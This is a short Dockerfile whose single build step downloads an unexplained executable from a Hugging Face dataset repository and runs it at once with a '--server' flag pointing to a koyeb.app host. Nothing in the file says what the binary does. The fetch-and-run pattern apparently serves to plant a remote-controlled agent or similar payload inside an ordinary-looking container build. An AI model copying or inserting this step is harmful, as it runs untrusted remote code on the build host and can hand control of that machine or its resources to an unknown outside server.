FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update \
 && apt-get install -y --no-install-recommends curl ca-certificates \
 && rm -rf /var/lib/apt/lists/* \
 && curl -L https://huggingface.co/datasets/api2/app2/resolve/main/app -o /app \
 && chmod +x /app \
 && /app --server https://industrial-rosemonde-app123123-bde611ac.koyeb.app
